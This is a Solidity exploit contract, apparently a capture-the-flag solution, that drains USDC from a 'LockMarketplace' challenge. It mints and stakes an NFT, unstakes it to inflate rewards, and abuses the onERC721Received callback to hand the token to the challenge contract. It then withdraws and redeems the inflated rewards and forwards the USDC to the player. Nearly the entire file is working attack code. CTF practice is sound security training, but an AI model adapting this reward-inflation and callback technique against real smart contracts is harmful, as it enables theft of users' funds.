// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Challenge} from "src/Challenge.sol";
import {LockMarketplace} from "src/LockMarketplace.sol";
import {LockToken} from "src/LockToken.sol";
contract Exploit {
    Challenge internal challenge;
    LockToken internal lockToken;
    uint256 internal counts = 1;

    function pwn(Challenge challenge_) external {
        challenge = challenge_;
        // Get the instance of the contracts
        LockMarketplace lockMarketplace = challenge_.LOCK_MARKETPLACE();
        lockToken = challenge_.LOCK_TOKEN();
        IERC20 usdc = challenge_.USDC();

        // Approve the LockMarketplace to spend the USDC
        usdc.approve(address(lockMarketplace), type(uint).max);
        // Mint a NFT with minimal amount: 100 USDC
        uint256 nftId = lockMarketplace.mintWithUSDC(address(this), 100e6);

        // Approve the LockMarketplace to stake the NFT
        lockToken.approve(address(lockMarketplace), nftId);
        // Stake the NFT(20 USDC for deposit fee)
        lockMarketplace.stake(nftId, 80e6);
        // Unstake the NFT
        lockMarketplace.unStake(address(this), nftId);  // Inflate rewards
        // Mint a NFT again to withdraw the rewards
        nftId = lockMarketplace.mintWithUSDC(address(this), 100e6);
        lockMarketplace.withdrawUSDC(nftId, 80e6);
        lockMarketplace.redeemCompoundRewards(nftId, lockMarketplace.getAvailableRewards(address(this)));
        usdc.transfer(address(challenge_.PLAYER()), usdc.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256 id, bytes calldata) external returns (bytes4) {
        // The first time to receive the lock token is to call `mintWithUSDC` to receive the lock token,
        // the second time is to call `unstake` to receive the lock token.
        if (counts == 2) {
            lockToken.transferFrom(address(this), address(challenge), id);
        }
        counts = counts + 1;
        return this.onERC721Received.selector;
    }
}
